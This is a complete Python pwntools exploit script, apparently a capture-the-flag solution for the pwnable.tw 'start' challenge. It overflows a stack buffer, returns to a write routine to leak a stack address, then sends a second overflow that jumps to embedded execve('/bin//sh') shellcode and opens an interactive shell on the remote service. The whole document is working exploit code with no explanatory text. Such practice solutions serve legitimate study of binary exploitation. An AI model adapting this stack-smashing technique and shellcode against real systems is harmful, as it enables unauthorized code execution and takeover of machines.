from pwn import * 
# s=process("./start")
s=remote("chall.pwnable.tw", 10000)
context.log_level="DEBUG"
raw_input("debug")
# gdb.attach(s,"b * 0x8048099")
sc="\x31\xC0\x31\xC9\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80"
pl="A"*20
pl+=p32(0x8048087)
s.sendafter("CTF:",pl)
leak = u32(s.recv(4))
print hex(leak)
pl2='A'*20
pl2+=p32(leak+0x14)
pl2+=sc
sleep(3)
s.sendline(pl2)
s.interactive()
